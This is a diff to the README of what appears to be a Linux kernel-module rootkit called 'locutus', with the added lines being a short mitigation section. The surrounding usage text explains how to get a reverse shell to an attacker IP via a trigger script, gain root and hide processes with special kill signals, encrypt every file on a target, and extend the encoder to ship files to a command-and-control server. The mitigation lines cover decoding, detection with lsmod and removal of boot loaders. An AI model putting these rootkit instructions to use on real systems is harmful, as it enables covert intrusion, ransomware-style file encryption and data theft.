@@ -5,7 +5,12 @@ get a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip>
 get root by using kill -64 $RANDOM
 hide a process by using kill -63 pid
 encode all files on the target with kill -62 $RANDOM 
-you can even extend the encoder to send all interesting files to a c2. To do this you need to change: c2_addr, c2_port in enc.py
+you can even extend the encoder to send all interesting files encoded to a c2. To do this you need to change: c2_addr, c2_port in enc.py
+
+Mitigation:
+You can decode any file by changing two chars in the enc.py file. You need to change the call to encode to decode.
+To detect this rootkit you could just use lsmod | grep locutus. To remove it you need to reboot the machine and first remove any functionality which loads the module at boot time. 
+Usual places for such loaders are /etc/modules, /etc/crontab, /etc/cron.d, /etc/init.d.
 
 https://github.com/MatthiasCr/LKM-Rootkit
 https://github.com/m0nad/Diamorphine
